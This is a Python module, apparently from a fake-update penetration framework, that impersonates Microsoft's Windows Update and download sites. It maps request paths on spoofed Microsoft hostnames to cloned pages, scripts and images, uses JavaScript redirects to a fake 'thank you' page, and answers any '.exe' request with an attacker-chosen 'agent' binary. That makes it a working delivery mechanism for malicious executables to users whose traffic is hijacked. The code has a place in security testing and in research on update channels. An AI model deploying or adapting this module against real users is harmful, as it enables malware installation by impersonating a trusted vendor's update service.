from modules import ModuleBase


class WindowsUpdate(ModuleBase):
    name = 'Windows Update'
    version = '1.0'
    appver = '< ie6 lastversion, ie7 7.0.5730.13, ie8 8.0.60001.18702'
    author = ['Francisco Amato < famato +[AT]+ infobytesec.com>']
    description = ''
    vh = '(windowsupdate.microsoft.com|update.microsoft.com|www.microsoft.com|go.microsoft.com)' 
    requests = [
        {   'path': '(/redirect.asp|^/$|/microsoftupdate/v6/default.aspx|redir.dll)',
            'type': 'file',
            'file': './include/wupdate/init.html',
        },
        {   'path': '(/fwlink/\?linkid|/fwlink/\?LinkId)',    #/fwlink/?LinkId=119721&clcid=0x409
            'type': 'redirect',
            'location': 'http://go.microsoft.com/dotnetfx35setup.exe'
        },
        {   'path': '/process.aspx',
            'type': 'string',
            'parse': 1,
            'string': '<html><script>parent.window.location="http://www.microsoft.com/downloads/thankyou.aspx?familyId=<%FAMILYID%>&displayLang=en"</script></html>',
            'file': './include/wupdate/init.html',
        },

        {   'path': '/process.aspx',
            'type': 'string',
            'parse': 1,
            'string': '<html><script>parent.window.location="http://www.microsoft.com/downloads/thankyou.aspx?familyId=<%FAMILYID%>&displayLang=en"</script></html>',
            'file': './include/wupdate/init.html',
        },

        {   'path': '/inc/mstoolbar.htm',
            'type': 'file',
            'file': './include/wupdate/inc/mstoolbar.htm',
        },

        {   'path': '/inc/spupdateids.js',
            'type': 'file',
            'file': './include/wupdate/inc/spupdateids.js',
        },

        {   'path': '/inc/trans_pixel.gif',
            'type': 'file',
            'file': './include/wupdate/inc/trans_pixel.gif',
        },

        {   'path': '/inc/toc_archivos/arrow.gif',
            'type': 'file',
            'file': './include/wupdate/inc/toc_archivos/arrow.gif',
        },

        {   'path': '/inc/toc_archivos/hcp.css',
            'type': 'file',
            'file': './include/wupdate/inc/toc_archivos/hcp.css',
        },

        {   'path': '/inc/toc_archivos/toc.css',
            'type': 'file',
            'file': './include/wupdate/inc/toc_archivos/toc.css',
        },

        {   'path': '/inc/toc_archivos/toc.js',
            'type': 'file',
            'file': './include/wupdate/inc/toc_archivos/toc.js',
        },

        {   'path': '/inc/toc_archivos/tgar.js',
            'type': 'file',
            'file': './include/wupdate/inc/toc_archivos/tgar.js',
        },

        {   'path': '/inc/toc_archivos/update_webtrends.js',
            'type': 'file',
            'file': './include/wupdate/inc/toc_archivos/update_webtrends.js',
        },

        {   'path': '/inc/commontop.js',
            'type': 'file',
            'file': './include/wupdate/inc/commontop.js',
        },

        {   'path': '/inc/mstoolbar_archivos/v6.htm',
            'type': 'file',
            'file': './include/wupdate/inc/mstoolbar_archivos/v6.htm',
        },

        {   'path': '/inc/mstoolbar_archivos/css.css',
            'type': 'file',
            'file': './include/wupdate/inc/mstoolbar_archivos/css.css',
        },

        {   'path': '/inc/mstoolbar_archivos/ms_masthead_ltr.gif',
            'type': 'file',
            'file': './include/wupdate/inc/mstoolbar_archivos/ms_masthead_ltr.gif',
        },

        {   'path': '/inc/mstoolbar_archivos/subbanner.jpg',
            'type': 'file',
            'file': './include/wupdate/inc/mstoolbar_archivos/subbanner.jpg',
        },

        {   'path': '/inc/redirect.js',
            'type': 'file',
            'file': './include/wupdate/inc/redirect.js',
        },

        {   'path': '/inc/footer.htm',
            'type': 'file',
            'file': './include/wupdate/inc/footer.htm',
        },

        {   'path': '/inc/splash.htm',
            'type': 'file',
            'parse': 1,
            'file': './include/wupdate/inc/splash.htm',
        },

        {   'path': '/inc/webcomtop.js',
            'type': 'file',
            'file': './include/wupdate/inc/webcomtop.js',
        },

        {   'path': '/inc/splash_archivos/trans_pixel_archivos/trans_pixel.gif',
            'type': 'file',
            'file': './include/wupdate/inc/splash_archivos/trans_pixel_archivos/trans_pixel.gif',
        },

        {   'path': '/inc/splash_archivos/icon.plus.gif',
            'type': 'file',
            'file': './include/wupdate/inc/splash_archivos/icon.plus.gif',
        },

        {   'path': '/inc/splash_archivos/trans_pixel.gif',
            'type': 'file',
            'file': './include/wupdate/inc/splash_archivos/trans_pixel.gif',
        },

        {   'path': '/inc/splash_archivos/content.js',
            'type': 'file',
            'file': './include/wupdate/inc/splash_archivos/content.js',
        },

        {   'path': '/inc/splash_archivos/hcp.css',
            'type': 'file',
            'file': './include/wupdate/inc/splash_archivos/hcp.css',
        },

        {   'path': '/inc/splash_archivos/tgar.js',
            'type': 'file',
            'file': './include/wupdate/inc/splash_archivos/tgar.js',
        },

        {   'path': '/inc/splash_archivos/content.css',
            'type': 'file',
            'file': './include/wupdate/inc/splash_archivos/content.css',
        },

        {   'path': '/inc/splash_archivos/update_webtrends.js',
            'type': 'file',
            'file': './include/wupdate/inc/splash_archivos/update_webtrends.js',
        },

        {   'path': '/inc/footer_archivos/v6.htm',
            'type': 'file',
            'file': './include/wupdate/inc/footer_archivos/v6.htm',
        },

        {   'path': '/inc/footer_archivos/css.css',
            'type': 'file',
            'file': './include/wupdate/inc/footer_archivos/css.css',
        },

        {   'path': '/inc/toc.htm',
            'type': 'file',
            'file': './include/wupdate/inc/toc.htm',
        },

        {   'path': '/inc/resultslist.js',
            'type': 'file',
            'file': './include/wupdate/inc/resultslist.js',
        },

        {   'path': '/inc/tgar.js',
            'type': 'file',
            'file': './include/wupdate/inc/tgar.js',
        },

        {   'path': '.exe',
            'type': 'agent',
            'method': '',
            'bin': 1,
            'string': '',
            'parse': 0,
            'file': ''
        }
    ]
    options = {
        'rnd1': {
            'val' : "rand_alpha(8) + '-' + rand_alpha(4) + '-' + rand_alpha(4) + '-' + rand_alpha(4) + '-' + rand_alpha(12)",
            'hidden': 1,
            'dynamic': 1,
        },
        'rnd2': {
            'val' : "rand_num(5)",
            'hidden': 1,
            'dynamic': 1,
        },

        'familyid': {
            'val': 'ad724ae0-e72d-4f54-9ab3-75b8eb148356',
        #1e1550cb-5e5d-48f5-b02b-20b602228de6 Internet Explorer 6 Service Pack
        #980bb421-950f-4825-8039-44cc961a47b8 XP security update
            'desc' : "It's the microsoft familyid from download center default (Removal tool)"
        },
    }